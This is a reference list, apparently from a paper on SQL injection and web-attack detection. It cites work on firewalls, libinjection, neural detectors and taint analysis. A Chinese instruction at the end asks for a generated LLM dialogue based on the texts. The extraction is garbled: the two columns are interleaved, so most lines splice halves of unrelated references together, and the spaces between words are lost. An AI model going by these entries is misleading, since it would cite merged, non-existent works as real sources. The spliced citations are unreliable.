+13,2(2010),398–404. [25] XinLiu,QingchenYu,XiaokangZhou,andQingguoZhou.2018.Owl-
+[7] StephenWBoydandAngelosDKeromytis.2004.SQLrand:Preventing Eye:AnAdvancedDetectionSystemofWebAttacksBasedonHMM.
+SQLinjectionattacks.InInternationalconferenceonappliedcryptogra- In2018IEEE16thIntlConfonDependable,AutonomicandSecureCom-
+phyandnetworksecurity.Springer,292–302. puting,16thIntlConfonPervasiveIntelligenceandComputing,4th
+[8] XiaoyiChen,QingniShen,PengCheng,YongqiangXiong,andZhong- IntlConfonBigDataIntelligenceandComputingandCyberScience
+haiWu.2022.RuleCache:AcceleratingWebApplicationFirewallsby andTechnologyCongress(DASC/PiCom/DataCom/CyberSciTech).IEEE,
+On-lineLearningTrafficPatterns.In2022IEEEInternationalConference 200–207.
+onWebServices(ICWS).IEEE,229–239. [26] XinLiu,WenqiangZhang,XiaokangZhou,andQingguoZhou.2021.
+[9] CorinnaCortesandVladimirVapnik.1995.Support-vectornetworks. MECGuard:GRUenhancedattackdetectioninMobileEdgeComputing
+Machinelearning20,3(1995),273–297. environment.ComputerCommunications172(2021),1–9.
+[10] Ignacio Samuel Crespo-Martínez, Adrián Campazas-Vega, Án- [27] DongzheLu,JinlongFei,andLongLiu.2023. ASemanticLearning-
+gelManuelGuerrero-Higueras,VirginiaRiego-DelCastillo,Claudia BasedSQLInjectionAttackDetectionTechnology. Electronics12,6
+ÁlvarezAparicio,andCaminoFernández-Llamas.2023.SQLInjection (2023),1344.Issue6. https://doi.org/10.3390/electronics12061344
+AttackDetectioninNetworkFlowData. Computers&Security127 [28] AoLuo,WeiHuang,andWenqingFan.2019.ACNN-basedApproach
+(2023),103093. https://doi.org/10.1016/j.cose.2023.103093 totheDetectionofSQLInjectionAttacks.In2019IEEE/ACIS18th
+[11] JohannesDahseandJörgSchwenk.2010.RIPS-Astaticsourcecode InternationalConferenceonComputerandInformationScience(ICIS).
+analyserforvulnerabilitiesinPHPscripts.InSeminarWork(Seminer IEEE,320–324.
+Çalismasi).HorstGörtzInstituteRuhr-UniversityBochum.Citeseer. [29] J.Mei.2009.AnApproachforSQLInjectionVulnerabilityDetection.
+[12] JesúsEDíaz-Verdejo,RafaelEstepaAlonso,AntonioEstepaAlonso, InInformationTechnology:NewGenerations,2009.ITNG’09.Sixth
+andGermanMadinabeitia.2022.Acriticalreviewofthetechniques InternationalConferenceon.
+usedforanomalydetectionofHTTP-basedattacks:taxonomy,limita- [30] BasemIbrahimMukhtarandMarianneAAzer.2020.Evaluatingthe
+tionsandopenchallenges.Computers&Security(2022),102997. modsecuritywebapplicationfirewallagainstsqlinjectionattacks.
+[13] Nick Galbreath. 2014. Libinjection. https://github.com/client9/ In202015thInternationalConferenceonComputerEngineeringand
+libinjection Systems(ICCES).IEEE,1–6.
+[14] NingGuo,XiaoyongLi,HuiYin,andYaliGao.2019.Vulhunter:An [31] PingCAP.2022.MySQLParser. https://github.com/pingcap/parser
+automatedvulnerabilitydetectionsystembasedondeeplearningand [32] Python.org.2022. TheofficialhomeofthePythonProgramming
+bytecode.InInternationalConferenceonInformationandCommunica- Language.https://python.org/.
+tionsSecurity.Springer,199–218. [33] Sanic.2022.SanicFramework.https://sanic.dev/en/.
+[15] WilliamGJHalfondandAlessandroOrso.2005.AMNESIA:analysis [34] SuperCowPowers. 2013. Data-Hacking. https://github.com/
+andmonitoringforneutralizingSQL-injectionattacks.InProceedings SuperCowPowers/data_hacking/tree/master/sql_injection/data
+ofthe20thIEEE/ACMinternationalConferenceonAutomatedsoftware [35] PengTang,WeidongQiu,ZhengHuang,HuijuanLian,andGuozhen
+engineering.174–183. Liu.2020.DetectionofSQLinjectionbasedonartificialneuralnetwork.
+[16] SeppHochreiterandJürgenSchmidhuber.1997. LongShort-term Knowl.BasedSyst.190(2020),105528.
+Memory.Neuralcomputation9(121997),1735–80. https://doi.org/10. [36] OmerTripp,MarcoPistoia,StephenJFink,ManuSridharan,andOmri
+1162/neco.1997.9.8.1735 Weisman.2009.TAJ:effectivetaintanalysisofwebapplications.ACM
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+SigplanNotices44,6(2009),87–97. [43] BinbinYong,XinLiu,QingchenYu,LiangHuang,andQingguoZhou.
+[37] AshishVaswani,NoamShazeer,NikiParmar,JakobUszkoreit,Llion 2019.MaliciousWebtrafficdetectionforInternetofThingsenviron-
+Jones,AidanNGomez,ŁukaszKaiser,andIlliaPolosukhin.2017. ments.Computers&ElectricalEngineering77(2019),260–272.
+AttentionisAllyouNeed.InAdvancesinNeuralInformationProcessing [44] HuafengZhang,BoZhao,HuiYuan,JinxiongZhao,XiaobinYan,and
+Systems,I.Guyon,U.V.Luxburg,S.Bengio,H.Wallach,R.Fergus, FangjunLi.2019.SQLinjectiondetectionbasedondeepbeliefnetwork.
+S.Vishwanathan,andR.Garnett(Eds.),Vol.30.CurranAssociates, InProceedingsofthe3rdInternationalConferenceonComputerScience
+Inc. andApplicationEngineering.1–6.
+[38] WordPress.2022. BlogTool,PublishingPlatform,andCMS. https: [45] SuZhangandYingZhang.2022.PrivacyLeakageVulnerabilityDe-
+//wordpress.org/. tectionforPrivacy-PreservingComputationServices.In2022IEEE
+[39] X.R.WuandPpkChan.2012. SQLinjectionattacksdetectionin InternationalConferenceonWebServices(ICWS).219–228. https:
+adversarialenvironmentsbyk-centers.InInternationalConferenceon //doi.org/10.1109/ICWS55610.2022.00043
+MachineLearning&Cybernetics. [46] YaqinZhang,DuoheMa,XiaoyanSun,KaiChen,andFengLiu.2020.
+[40] Z.Xiao,Z.Zhou,W.Yang,andC.Deng.2017.AnapproachforSQL WGT:ThwartingWebAttacksThroughWebGeneTree-basedMoving
+injectiondetectionbasedonbehaviorandresponseanalysis.In2017 TargetDefense.In2020IEEEInternationalConferenceonWebServices
+IEEE9thInternationalConferenceonCommunicationSoftwareand (ICWS).364–371. https://doi.org/10.1109/ICWS49710.2020.00054
+Networks(ICCSN). [47] FZHAOY,GXIONG,etal.2016. SQLinjectionbehaviordetection
+[41] LiuXin,LiuZiang,ZhangYingli,ZhangWenqiang,LvDong,and methodfornetworkenvironment[J].JournalofCommunications37,
+ZhouQingguo.2022.TCNenhancednovelmalicioustrafficdetection 2(2016),88–97.
+forIoTdevices.ConnectionScience34,1(2022),1322–1341. [48] M.Zolotukhin,T.Hämäläinen,T.Kokkonen,andJ.Siltanen.2014.
+[42] WenchuanYang,WenZuo,andBaojiangCui.2019. DetectingMa- AnalysisofHTTPRequestsforAnomalyDetectionofWebAttacks.In
+liciousURLsviaaKeyword-BasedConvolutionalGated-Recurrent- 2014IEEE12thInternationalConferenceonDependable,Autonomicand
+UnitNeuralNetwork. IEEEAccess 7(2019),29891–29900. https: SecureComputing.406–411. https://doi.org/10.1109/DASC.2014.79
+//doi.org/10.1109/ACCESS.2019.2895751=====================
+
+
+你是一位专业的文献阅读者，上面我已经传入一段多个文献的内容，不同文献之间已使用'====================='进行分割，请你使用中文给出基于这些文献的大模型对话。
